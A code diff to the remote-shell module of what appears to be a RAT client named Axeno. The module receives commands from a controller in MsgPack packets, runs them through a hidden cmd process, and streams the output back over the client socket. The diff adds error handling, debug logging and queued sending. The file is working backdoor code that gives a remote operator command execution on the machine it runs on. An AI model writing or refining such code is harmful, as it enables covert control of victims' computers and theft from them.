@@ -4,10 +4,12 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Linq.Expressions;
 using System.Management;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Axeno.Client.Networking.Functions.System
 {
@@ -16,19 +18,27 @@ namespace Axeno.Client.Networking.Functions.System
         public static Process cmd;
         public static void HandlePacket(MsgPack msgpck)
         {
-            string status = msgpck.ForcePathObject("Status").AsString;
-            string command = msgpck.ForcePathObject("Command").AsString;
-            if(status == "begin")
+            try
             {
-                BeginCMD();
-            }else if (status == "end")
-            {
-                EndCMD();
-            }
-            if (command != null || command != "")
-            {
-                WriteCMD(command);
+                string status = msgpck.ForcePathObject("Status").AsString;
+                string command = msgpck.ForcePathObject("Command").AsString;
+                if (status == "begin")
+                {
+                    BeginCMD();
+                }
+                else if (status == "end")
+                {
+                    EndCMD();
+                }
+                if (command != null || command != "")
+                {
+                    
+                    WriteCMD(command);
 
+                }
+            }catch(Exception ex)
+            {
+                Debug.WriteLine(ex.ToString());
             }
 
         }
@@ -55,15 +65,18 @@ namespace Axeno.Client.Networking.Functions.System
         }
         public static void EndCMD()
         {
+            ShellClose();
 
         }
         public static void WriteCMD(string command)
         {
+            
             if(command.ToLower() == "exit")
             {
                 ShellClose();
             }else
             {
+                Debug.WriteLine($"{command}");
                 cmd.StandardInput.WriteLine(command);
 
             }
@@ -74,10 +87,13 @@ namespace Axeno.Client.Networking.Functions.System
             try
             {
                 Output.AppendLine(e.Data);
+                Debug.WriteLine(e.Data);
+
+
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "cmd";
                 msgpack.ForcePathObject("Response").AsString = Output.ToString();
-                ClientSocket.Send(msgpack.Encode2Bytes());
+                ClientSocket.QueueCommand(msgpack.Encode2Bytes());
             }
             catch { }
         }
